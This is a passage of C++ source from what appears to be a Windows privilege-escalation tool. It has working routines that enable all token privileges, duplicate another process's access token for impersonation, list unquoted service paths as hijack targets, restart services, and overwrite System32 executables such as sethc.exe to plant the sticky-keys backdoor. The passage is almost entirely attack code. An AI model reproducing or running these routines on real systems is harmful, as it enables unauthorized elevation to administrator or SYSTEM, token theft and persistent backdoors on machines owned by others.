									printf("%ls\n", properties->pszwName);
									_NcFreeNetconProperties(properties);
								}
								connection->Release();
							}
							if (!success) {
								printf("No network interfaces\n");
							}
							connections->Release();
						}
						manager->Release();
					}
					CoUninitialize();
				}
			}
			FreeLibrary(hLib);
		}
		return success;
	}

	// --------------------------------------- SECTION: TOKENS

	void EnableAccessTokenPrivs() {
		HANDLE hToken = NULL;
		if (OpenProcessToken(GetCurrentProcess(), (TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), &hToken) == 0) {
			printf("Cannot get the process token handle\n");
		}
		else {
			struct priv {
				const char* name;
				bool set;
			};
			priv array[] = {
				{ "SeAssignPrimaryTokenPrivilege",             false },
				{ "SeAuditPrivilege",                          false },
				{ "SeBackupPrivilege",                         false },
				{ "SeChangeNotifyPrivilege",                   false },
				{ "SeCreateGlobalPrivilege",                   false },
				{ "SeCreatePagefilePrivilege",                 false },
				{ "SeCreatePermanentPrivilege",                false },
				{ "SeCreateSymbolicLinkPrivilege",             false },
				{ "SeCreateTokenPrivilege",                    false },
				{ "SeDebugPrivilege",                          false },
				{ "SeDelegateSessionUserImpersonatePrivilege", false },
				{ "SeEnableDelegationPrivilege",               false },
				{ "SeImpersonatePrivilege",                    false },
				{ "SeIncreaseBasePriorityPrivilege",           false },
				{ "SeIncreaseQuotaPrivilege",                  false },
				{ "SeIncreaseWorkingSetPrivilege",             false },
				{ "SeLoadDriverPrivilege",                     false },
				{ "SeLockMemoryPrivilege",                     false },
				{ "SeMachineAccountPrivilege",                 false },
				{ "SeManageVolumePrivilege",                   false },
				{ "SeProfileSingleProcessPrivilege",           false },
				{ "SeRelabelPrivilege",                        false },
				{ "SeRemoteShutdownPrivilege",                 false },
				{ "SeRestorePrivilege",                        false },
				{ "SeSecurityPrivilege",                       false },
				{ "SeShutdownPrivilege",                       false },
				{ "SeSyncAgentPrivilege",                      false },
				{ "SeSystemEnvironmentPrivilege",              false },
				{ "SeSystemProfilePrivilege",                  false },
				{ "SeSystemtimePrivilege",                     false },
				{ "SeTakeOwnershipPrivilege",                  false },
				{ "SeTcbPrivilege",                            false },
				{ "SeTimeZonePrivilege",                       false },
				{ "SeTrustedCredManAccessPrivilege",           false },
				{ "SeUndockPrivilege",                         false },
				{ "SeUnsolicitedInputPrivilege",               false }
			};
			int size = sizeof(array) / sizeof(array[0]);
			for (int i = 0; i < size; i++) {
				TOKEN_PRIVILEGES tp = { };
				if (LookupPrivilegeValueA(NULL, array[i].name, &tp.Privileges[0].Luid) != 0) {
					tp.PrivilegeCount = 1;
					tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
					if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL) != 0 && GetLastError() == ERROR_SUCCESS) {
						array[i].set = true;
					}
				}
			}
			printf("############################ PRIVILEGES ENABLED ############################\n");
			for (int i = 0; i < size; i++) {
				if (array[i].set) {
					printf("# %-72.72s #\n", array[i].name);
				}
			}
			printf("############################################################################\n");
			printf("\n");
			printf("########################## PRIVILEGES NOT ENABLED ##########################\n");
			for (int i = 0; i < size; i++) {
				if (!array[i].set) {
					printf("# %-72.72s #\n", array[i].name);
				}
			}
			printf("############################################################################\n");
			CloseHandle(hToken);
		}
	}

	HANDLE DuplicateAccessToken(DWORD pid) {
		HANDLE dToken = NULL;
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
		if (hProcess == NULL) {
			printf("Cannot get the process handle\n");
		}
		else {
			HANDLE hToken = NULL;
			if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY), &hToken) == 0) {
				printf("Cannot get the process token handle\n");
			}
			else {
				if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken) == 0) {
					printf("Cannot duplicate the process token\n");
				}
				else {
					printf("Process token has been duplicated successfully\n");
				}
				CloseHandle(hToken);
			}
			CloseHandle(hProcess);
		}
		return dToken;
	}

	// --------------------------------------- SECTION: SERVICES

	// NOTE: This method will only search for unquoted service paths outside of the \Windows\ directory.
	// NOTE: Services must be able to start either automatically or manually; and be either running or stopped.
	std::string GetUnquotedServiceName() {
		std::string name = "";
		SC_HANDLE hManager = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE);
		if (hManager == NULL) {
			printf("Cannot get the service control manager handle\n");
		}
		else {
			DWORD size = 0, count = 0, resume = 0;
			if (EnumServicesStatusA(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &size, &count, 0) != 0) {
				printf("Cannot get the additional process memory size\n");
			}
			else {
				HANDLE hHeap = GetProcessHeap();
				if (hHeap == NULL) {
					printf("Cannot get the process heap handle\n");
				}
				else {
					LPENUM_SERVICE_STATUSA services = (LPENUM_SERVICE_STATUSA)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
					if (services == NULL) {
						printf("Cannot allocate the additional process memory\n");
					}
					else {
						if (EnumServicesStatusA(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, services, size, &size, &count, &resume) == 0) {
							printf("Cannot enumerate the services\n");
						}
						else {
							bool exists = false;
							for (DWORD i = 0; i < count; i++) {
								SC_HANDLE hService = OpenServiceA(hManager, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
								if (hService != NULL) {
									if (QueryServiceConfigA(hService, NULL, 0, &size) == 0) {
										LPQUERY_SERVICE_CONFIGA config = (LPQUERY_SERVICE_CONFIGA)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
										if (config != NULL) {
											if (QueryServiceConfigA(hService, config, size, &size) != 0) {
												std::string path = StrToLower(config->lpBinaryPathName);
												if (path.find("\"") == std::string::npos && path.find(":\\windows\\") == std::string::npos && (config->dwStartType == SERVICE_AUTO_START || config->dwStartType == SERVICE_DEMAND_START) && (services[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING || services[i].ServiceStatus.dwCurrentState == SERVICE_STOPPED)) {
													exists = true;
													printf("Name        : %s\n", services[i].lpServiceName);
													printf("DisplayName : %s\n", services[i].lpDisplayName);
													printf("PathName    : %s\n", config->lpBinaryPathName);
													printf("StartName   : %s\n", config->lpServiceStartName);
													printf("StartMode   : %s\n", config->dwStartType == SERVICE_AUTO_START ? "Auto" : "Manual");
													printf("State       : %s\n", services[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped");
													printf("\n");
												}
											}
											HeapFree(hHeap, 0, config);
										}
									}
									CloseServiceHandle(hService);
								}
							}
							if (!exists) {
								printf("No unquoted service paths\n");
							}
							else {
								std::string svc = Input("Enter service name");
								if (svc.length() < 1) {
									printf("\n");
									printf("Service name is rquired\n");
								}
								else {
									exists = false;
									for (DWORD i = 0; i < count; i++) {
										if (services[i].lpServiceName == svc) {
											exists = true;
											name = services[i].lpServiceName;
											break;
										}
									}
									if (!exists) {
										printf("\n");
										printf("Service does not exists\n");
									}
								}
							}
						}
						HeapFree(hHeap, 0, services);
					}
					CloseHandle(hHeap);
				}
			}
			CloseServiceHandle(hManager);
		}
		return name;
	}

	bool ManageService(std::string name, int task) {
		bool success = false;
		SC_HANDLE hManager = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE);
		if (hManager == NULL) {
			printf("Cannot get the service control manager handle\n");
		}
		else {
			SC_HANDLE hService = OpenServiceA(hManager, name.c_str(), (SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP));
			if (hService == NULL) {
				printf("Cannot get the service handle\n");
			}
			else {
				SERVICE_STATUS info = { };
				if (QueryServiceStatus(hService, &info) == 0) {
					printf("Cannot get the service information\n");
				}
				else {
					if (task == SVC_STOP || task == SVC_RESTART) {
						if (info.dwCurrentState == SERVICE_STOPPED) {
							success = true;
							printf("Service is not running\n");
						}
						else if (ControlService(hService, SERVICE_CONTROL_STOP, &info) == 0) {
							success = false;
							printf("Cannot stop the service\n");
						}
						else {
							do {
								Sleep(400);
								if (QueryServiceStatus(hService, &info) == 0) {
									success = false;
									printf("Cannot update the service information\n");
									break;
								}
							} while (info.dwCurrentState != SERVICE_STOPPED);
							if (info.dwCurrentState == SERVICE_STOPPED) {
								success = true;
								printf("Service has been stopped successfully\n");
							}
						}
					}
					if (task == SVC_RESTART) {
						printf("\n");
					}
					if (task == SVC_START || task == SVC_RESTART) {
						if (info.dwCurrentState == SERVICE_RUNNING) {
							success = true;
							printf("Service is already running\n");
						}
						else if (StartServiceA(hService, 0, NULL) == 0) {
							success = false;
							printf("Cannot start the service\n");
						}
						else {
							do {
								Sleep(400);
								if (QueryServiceStatus(hService, &info) == 0) {
									success = false;
									printf("Cannot update the service information\n");
									break;
								}
							} while (info.dwCurrentState != SERVICE_RUNNING);
							if (info.dwCurrentState == SERVICE_RUNNING) {
								success = true;
								printf("Service has been started successfully\n");
							}
						}
					}
				}
				CloseServiceHandle(hService);
			}
			CloseServiceHandle(hManager);
		}
		return success;
	}

	// --------------------------------------- SECTION: MISCELLANEOUS

	// NOTE: File must be a \System32\ executable file, e.g. sethc.exe, etc.
	// TO DO: Check if the file exists. Implement a restore method.
	bool ReplaceSystem32File(std::string dst, std::string src) {
		bool success = false;
		std::string dir = GetWinDir(true);
		if (dir.length() > 0) {
			std::string dstFull = std::string(dir).append(dst);
			std::string srcFull = std::string(dir).append(src);
			std::string backup = std::string(dst).append(".backup");
			std::string backupFull = std::string(dir).append(backup);
			if (CopyFileA(dstFull.c_str(), backupFull.c_str(), FALSE) == 0) {
				printf("Cannot copy \"%s\" to \"%s\"\n", dst.c_str(), backup.c_str());
			}
			else if (CopyFileA(srcFull.c_str(), dstFull.c_str(), FALSE) == 0) {
				DeleteFileA(backupFull.c_str());
				printf("Cannot copy \"%s\" to \"%s\"\n", src.c_str(), dst.c_str());
			}
			else {
				success = true;
				printf("\"%s\" has been successfully copied to \"%s\"\n", src.c_str(), dst.c_str());
				printf("\n");
				printf("To restore the original file, rename \"%s\" back to \"%s\"\n", backup.c_str(), dst.c_str());
			}
		}
		return success;
	}

}
